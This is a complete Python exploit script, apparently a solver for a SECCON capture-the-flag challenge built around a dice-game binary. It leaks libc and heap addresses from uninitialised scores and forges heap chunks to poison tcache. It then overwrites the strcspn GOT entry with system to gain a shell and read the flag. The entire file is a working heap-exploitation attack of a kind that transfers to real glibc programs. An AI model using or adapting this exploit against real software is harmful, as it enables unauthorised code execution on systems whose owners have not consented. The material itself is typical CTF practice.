#!/usr/bin/env python3
from ptrlib import *
from tqdm import tqdm
import os

SECCON_HOST = os.getenv("SECCON_HOST", "localhost")
SECCON_PORT = int(os.getenv("SECCON_PORT", "9999"))

def init(name1, name2):
    sock.sendline(name1)
    sock.sendline(name2)

def game(pos):
    for p in pos:
        if p[0]:
            sock.sendlineafter('(1-6): ', str(p[0]))
        if p[1]:
            sock.sendlineafter('(1-6): ', str(p[1]))

def cont():
    sock.sendlineafter(b'[No=0 / Yes=1 / Reset=2]: ', b'1')

def reset():
    sock.sendlineafter(b'[No=0 / Yes=1 / Reset=2]: ', b'2')

libc = ELF("./libc.so.6")
elf = ELF("./game")
#sock = Process("./chall")
sock = Socket(SECCON_HOST, SECCON_PORT)

win_player1 = [(i,i) for i in range(1,6)] + [(6,None)]
win_player2 = [(i,6) for i in [1,1,2,3,4,5]]

init(b'A'*8, b'B'*8)

# make game.score[1] > 0x10000
c = 0x10000
buf = ""
for p in win_player2:
    if p[0]: buf += str(p[0]) + "\n"
    if p[1]: buf += str(p[1]) + "\n"
buf += "1\n"

STRIDE = 0x400
for i in tqdm(range(0, c - (0x80 - 7), STRIDE)):
    if i + STRIDE >= c - (0x80 - 7):
        n = (c - (0x80 - 7) - i)
    else:
        n = STRIDE
    sock.send(buf * n)
    for j in range(n):
        sock.recvuntil("]: ")
game(win_player2)
reset()

buf = ""
for p in win_player2:
    if p[0]: buf += str(p[0]) + "\n"
    if p[1]: buf += str(p[1]) + "\n"
buf += "2\n"

for _ in tqdm(range(0x80 - 7)):
    init(b'A'*8, b'B'*8)
    sock.send(buf)
    sock.recvuntil("]: ")

# vuln: mchunk_size of game_t == 0x10051
init((b'\x00'*0x440+flat([0, 0x11, 0, 0x11], map=p64)).ljust(0xfff0, b'\x00')+flat([0, 0x11, 0, 0x11], map=p64), b'C'*8)
game([(1,1) for _ in range(4)] + [(1,2)] + [(3,2) for _ in range(5)])
reset()

# leak libc addr from largebin bk (uninit score[0])
init(b'D'*8, b'E'*0x80)
sock.recvuntil(b'--- Score ---\n')
found = sock.recvregex(": ([0-9]+) pt")
libc.base = int(found[0]) - libc.main_arena() - 0x7d0
found = sock.recvregex(': ([0-9]+) pt')

# leak heap addr from largebin fd_nextsize (uninit score[1])
addr_heap_base = int(found[0]) - 0x410
logger.info("heap = " + hex(addr_heap_base))

game(win_player1)
reset()

# free game_t and link to unsortedbin
fake_chunks  = flat([0, 0x421, addr_heap_base >> 12], map=p64)
init(b'F'*0x20 + fake_chunks, b'G'*8)
game(win_player1)
reset()

# 2 chunks in unsortedbin (0x50 bytes) -> link to tcache
addr_heap_fakechunks = addr_heap_base + 0x410
addr_heap_fake_a = addr_heap_fakechunks
addr_heap_fake_b = addr_heap_fakechunks + 0x50*1
fake_chunks  = flat([0, 0x51, addr_heap_fake_b, libc.main_arena()+0x60], map=p64).ljust(0x50, b'\x00')    # a: head
fake_chunks += flat([0x50, 0x50, libc.main_arena()+0x60, addr_heap_fake_a], map=p64).ljust(0x50, b'\x00') # b: tail
fake_chunks += flat([0x50, 0x10], map=p64)
init(b'H'*0x20 + fake_chunks, b'I'*0x100)
game(win_player1)
reset()

# tamper tcache next
fake_chunks  = flat([0, 0x51,  (addr_heap_base >> 12)^(0)], map=p64).ljust(0x50, b'\x00')  # a: 2
fake_chunks += flat([0, 0x101, (addr_heap_base >> 12)^(elf.symbol('reset_count')+8)], map=p64)          # b: 1
init(b'J'*0x20 + fake_chunks, b'K'*8)
game(win_player1)
reset() # link to tcache (0x100 byte)

# alloc game_t in .bss and clear name ptr/len
init(b'L'*8, b'M'*8)
game(win_player1)
reset() # link to tcache (0x80 byte)

init(b'N'*0x10 + p8(0xd0-0x11) + flat([elf.got('strcspn')-8, 0x100], map=p64),
     b'/bin/sh\x00' + p64(libc.symbol("system")))

sock.sendline("cat /flag*")
print(sock.recvregex(r"SECCON\{.+\}"))

sock.close()
